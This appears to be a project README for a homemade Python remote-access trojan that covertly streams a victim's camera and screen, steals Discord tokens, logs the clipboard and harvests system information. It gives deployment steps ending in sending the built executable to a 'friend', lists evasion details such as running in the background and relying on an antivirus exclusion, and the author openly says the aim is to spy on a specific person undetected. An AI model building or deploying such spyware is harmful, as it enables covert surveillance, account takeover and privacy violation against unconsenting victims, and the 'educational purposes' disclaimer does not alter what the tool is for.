# I have enemies 

[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)

This virus enables the utilization of the client's camera and screen.

Upon building client.pyw, it operates within background processes.

## Change log for version 4v:
- Added a console on the client page (in case there's any error on the client side). It wasn't present in version 3, but I wrote that it was.
- Added PC information (knows everything from IP to all disks).
- Discord token stealer (with them, you can bypass two-factor authentication and access an account).
- Split the entire script (200 lines) into smaller files to make it clear what's happening in the code.
- ClipboardLogger.

## Todo:
- You can add an auto-update system, but alternatively, you could make the client simply fetch the code from the server. Well, we need to think about it.
- Key logger (don't see much point, to be honest).
- Make it a real virus, not just a toy to play with. This condition will be met when my "friend" spends a whole day with this virus and doesn't notice anything (well, he's not really a friend anymore, and he's a hypocrite, which is why I'm making this virus to teach him a lesson).

## Tutorial:

1. Set up a Python server. (you can use repl.it)
2. Upload the server.py file and the templates folder to the server.
3. Change the port in the last line of server.py to match your server's port.
4. In line 7 of client.pyw, replace '127.0.0.1:5000' with your server's IP address and port.
5. Start your server.
6. Build client.pyw, add file 'NoCamera.avi', add all modules and select the checkbox "--uac-admin".
7. Share the generated client.exe file with your friend.


### Requirements for server:
```
Flask
opencv-python
numpy
```

### Requirements for client:
```
cv2
numpy
pyautogui
requests
pyperclip
pycrypto
discord.py
pywin32
cpuinfo
psutil
tkinter
```

### How to delete this:
1. go to antivirus and delete exclusion folder

### Known issues:
1. Working only on Windows
2. Working only if antivirus is windows defender


# DISCLAIMER: THIS IS FOR EDUCATIONAL PURPOSES ONLY.
